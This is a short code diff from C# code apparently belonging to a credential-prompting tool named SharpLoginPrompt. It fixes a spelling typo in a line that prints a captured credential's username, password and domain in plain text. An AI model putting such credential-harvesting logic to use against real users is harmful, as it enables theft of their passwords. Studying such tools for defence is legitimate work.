@@ -186,7 +186,7 @@ namespace SharpLoginPrompt
                             };
                             Console.WriteLine("Username = " + networkCredential.UserName);
                             Console.WriteLine("Password = " + networkCredential.Password);
-                            Console.WriteLine("Doamain = " + networkCredential.Domain);
+                            Console.WriteLine("Domain = " + networkCredential.Domain);
                             string userName;
                             if (networkCredential.UserName.ToString().Contains("\\"))
                             {
